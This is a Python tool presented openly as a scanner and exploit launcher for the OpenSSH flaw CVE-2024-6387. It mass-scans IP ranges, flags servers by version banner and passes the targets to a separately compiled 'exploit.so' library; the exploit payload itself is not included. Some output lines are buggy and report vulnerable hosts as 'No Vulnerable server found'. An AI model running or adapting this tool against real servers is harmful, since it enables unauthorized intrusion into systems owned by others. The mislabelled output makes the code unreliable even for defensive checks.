import socket
import argparse
import ipaddress
import threading
from queue import Queue
import csv
import json
import ctypes

# after compiling your 'exploit.so' uncomment this parts

# Load the shared library
#import ctypes.util
#lib_path = ctypes.util.find_library('exploit')
#lib = ctypes.CDLL(lib_path)

lib = ctypes.CDLL('./exploit.so')  

# Define the argument and return types
lib.exploit_vulnerability.argtypes = [ctypes.c_char_p, ctypes.c_int]
lib.exploit_vulnerability.restype = ctypes.c_int


class Color:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

def is_port_open(ip, port, timeout):
    """Check if a port is open on a given IP."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((ip, port))
        sock.close()
        return True
    except:
        return False

def get_ssh_banner(ip, port, timeout):
    """Retrieve SSH banner from a target."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        banner = sock.recv(1024).decode().strip()
        sock.close()
        return banner
    except Exception as e:
        return str(e)

def check_vulnerability(ip, port, timeout, result_queue):
    """Check if a server is running a vulnerable version of OpenSSH."""
    if not is_port_open(ip, port, timeout):
        result_queue.put((ip, port, 'closed', "Port closed"))
        return

    banner = get_ssh_banner(ip, port, timeout)
    vulnerable_versions = [
        'OpenSSH_8.5p1',
        'OpenSSH_8.6p1',
        'OpenSSH_8.7p1',
        'OpenSSH_8.8p1',
        'OpenSSH_8.9p1',
        'OpenSSH_9.0p1',
        'OpenSSH_9.1p1',
        'OpenSSH_9.2p1',
        'OpenSSH_9.3p1',
        'OpenSSH_9.4p1',
        'OpenSSH_9.5p1',
        'OpenSSH_9.6p1',
        'OpenSSH_9.7p1'
    ]

    if any(version in banner for version in vulnerable_versions):
        result_queue.put((ip, port, 'vulnerable', f"(running {banner})"))
    else:
        result_queue.put((ip, port, 'not_vulnerable', f"(running {banner})"))

def scan_ports(targets, port, timeout, output_format=None, output_file=None):
    """Scan ports on multiple targets and optionally write results to a file."""
    ips = []
    for target in targets:
        try:
            with open(target, 'r') as file:
                ips.extend(file.readlines())
        except IOError:
            if '/' in target:
                try:
                    network = ipaddress.ip_network(target, strict=False)
                    ips.extend([str(ip) for ip in network.hosts()])
                except ValueError:
                    print(f"{Color.RED}[-] Invalid: {target}{Color.RESET}")
            else:
                ips.append(target.strip())

    result_queue = Queue()
    threads = []

    for ip in ips:
        ip = ip.strip()
        thread = threading.Thread(target=check_vulnerability, args=(ip, port, timeout, result_queue))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    total_scanned = len(ips)
    closed_ports = 0
    not_vulnerable = []
    vulnerable = []

    while not result_queue.empty():
        ip, port, status, message = result_queue.get()
        if status == 'closed':
            closed_ports += 1
        elif status == 'vulnerable':
            vulnerable.append((ip, message))
        elif status == 'not_vulnerable':
            not_vulnerable.append((ip, message))
        else:
            print(f"{Color.YELLOW}⚠️ [!] Server at {ip}:{port} is {message}{Color.RESET}")

    print(f"\n{Color.GREEN}No vulnerable server found: {len(not_vulnerable)}{Color.RESET}\n")
    for ip, msg in not_vulnerable:
        print(f"{Color.GREEN}[+] No Vulnerable server found at {ip} {msg}{Color.RESET}")
    for ip, msg in vulnerable:
        print(f"{Color.RED}[+] No Vulnerable server found at {ip} {msg}{Color.RESET}")
    print("\n")
    print(f"""{Color.CYAN}Summary{Color.RESET}:
          
    Total targets: {Color.GREEN}{total_scanned}{Color.RESET} server 
    Vulnerable: {Color.RED}{len(vulnerable)}{Color.RESET} server 
    Not vulnerable: {Color.GREEN}{len(not_vulnerable)}{Color.RESET} server
    Port {Color.RED}{port}{Color.RED}{Color.RESET} closed: {Color.YELLOW}{closed_ports}{Color.RESET} server""")

 
    if output_format and output_file:
        if output_format == 'csv':
            with open(output_file, 'w', newline='') as csvfile:
                csv_writer = csv.writer(csvfile)
                csv_writer.writerow(['IP', 'Status', 'Message'])
                for ip, msg in not_vulnerable:
                    csv_writer.writerow([ip, 'No vulnerable server found', msg])
                for ip, msg in vulnerable:
                    csv_writer.writerow([ip, 'Vulnerable server fo', msg])
                csvfile.flush()
            print(f"\n{Color.CYAN}✅ Results saved to {output_file} in CSV format.{Color.RESET}")
        
        elif output_format == 'txt':
            with open(output_file, 'w') as txtfile:
                txtfile.write(f"No vulnerable server found: {len(not_vulnerable)}\n")
                for ip, msg in not_vulnerable:
                    txtfile.write(f"   [+] No vulnerable server found at {ip} {msg}\n")
                txtfile.write(f"\nVunerable server found: {len(vulnerable)}\n")
                for ip, msg in vulnerable:
                    txtfile.write(f"   [+] Vulnerable server found at {ip} {msg}\n")
            print(f"\n{Color.CYAN}✅ Results saved to {output_file} in TXT format.{Color.RESET}")

        elif output_format == 'json':
            output_dict = {
                'No vulnerable server found': [{ip: msg} for ip, msg in not_vulnerable],
                'Vulnerable server found': [{ip: msg} for ip, msg in vulnerable]
            }
            with open(output_file, 'w') as jsonfile:
                json.dump(output_dict, jsonfile, indent=4)
            print(f"\n{Color.CYAN}✅ Results saved to {output_file} in JSON format.{Color.RESET}")
 


def exploit_vulnerability(targets, port):
    """Exploit vulnerability on vulnerable servers."""
    print(f"{Color.GREEN}Exploiting vulnerabilities...{Color.RESET}")

    targets = ','.join(targets)

    # Call the C function
    result = lib.exploit_vulnerability(targets.encode(), port)
    
    # Check the result if necessary
    if result == 0:
        print("Exploitation successful!")
    else:
        print("Exploitation failed.")

def main():
    banner = f"""{Color.GREEN}
 ██████╗ ██████╗ ███████╗███╗   ██╗███████╗███████╗██╗  ██╗
██╔═══██╗██╔══██╗██╔════╝████╗  ██║██╔════╝██╔════╝██║  ██║
██║   ██║██████╔╝█████╗  ██╔██╗ ██║███████╗███████╗███████║
██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║╚════██║╚════██║██╔══██║
╚██████╔╝██║     ███████╗██║ ╚████║███████║███████║██║  ██║
 ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝
   Author: l0n3m4n / Scanner: @xaitax / PoC: @7etsuo 
    {Color.RESET}"""
    parser = argparse.ArgumentParser(description="Checking OpenSSH (CVE-2024-6387) vulnerability and perform exploitation.",
                                    epilog='Example usage: python3 CVE-2024-6387.py -s <targets> -p 22 -t 3 -o json -f target_server.json')
    print(banner)
    parser.add_argument("targets", nargs='+', help="IP addresses, domain names, file paths containing IP addresses, or CIDR network ranges.")
    parser.add_argument("-s", "--scan", action='store_true', help="Perform vulnerability check and port scanning.")
    parser.add_argument("-e", "--exploit", action='store_true', help="Exploiting OpenSSH vulnerabilities.")
    parser.add_argument("-p", "--port", type=int, default=22, help="Port number to check or exploit (default: 22).")
    parser.add_argument("-t", "--timeout", type=float, default=1.0, help="Connection timeout in seconds (default: 1 second).")
    parser.add_argument("-o", "--output", choices=['csv', 'txt', 'json'], help="Output format for results.")
    parser.add_argument("-f", "--output-file", help="File to save results to. (e.q: result.json)")

    args = parser.parse_args()
    targets = args.targets
    port = args.port
    timeout = args.timeout

    if args.scan:
        output_format = args.output if args.output else None
        output_file = args.output_file if args.output_file else None
        scan_ports(targets, port, timeout, output_format, output_file)
    elif args.exploit:
        exploit_vulnerability(targets, port)
    else:
        print("Please specify either --scan (-s) or --exploit (-e) option.")

if __name__ == "__main__":
    main()


